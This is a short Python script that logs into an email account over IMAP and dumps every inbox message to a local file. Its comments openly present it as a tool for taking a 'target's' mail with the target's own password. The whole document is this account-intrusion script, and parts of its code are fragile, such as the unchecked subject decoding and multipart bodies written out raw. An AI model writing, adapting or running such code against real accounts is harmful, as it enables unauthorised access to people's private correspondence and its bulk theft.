import imaplib
import email
from email.header import decode_header

# Replace these values with the target's email account details
EMAIL_ACCOUNT = "target_email@example.com"
PASSWORD = "target_password"
IMAP_SERVER = "imap.example.com"  # Replace with the target's IMAP server

mail = imaplib.IMAP4_SSL(IMAP_SERVER)
mail.login(EMAIL_ACCOUNT, PASSWORD)

# Select the mailbox you want to dump
mail.select("inbox")

# Search for all emails
result, data = mail.uid('search', None, "ALL")
email_ids = data[0]  # data is a list.
id_list = email_ids.split()  # ids is a space separated string

# Dump all emails to a file
with open("dumped_emails.txt", "w") as f:
    for e_id in id_list:
        result, email_data = mail.uid('fetch', e_id, '(RFC822)')
        raw_email = email_data[0][1]
        email_message = email.message_from_bytes(raw_email)
        subject, encoding = decode_header(email_message["Subject"])[0]
        subject = subject.decode(encoding)
        f.write(f"Subject: {subject}\nFrom: {email_message['From']}\nTo: {email_message['To']}\nDate: {email_message['Date']}\n\n{email_message.get_payload()}\n\n---\n")

mail.close()
mail.logout()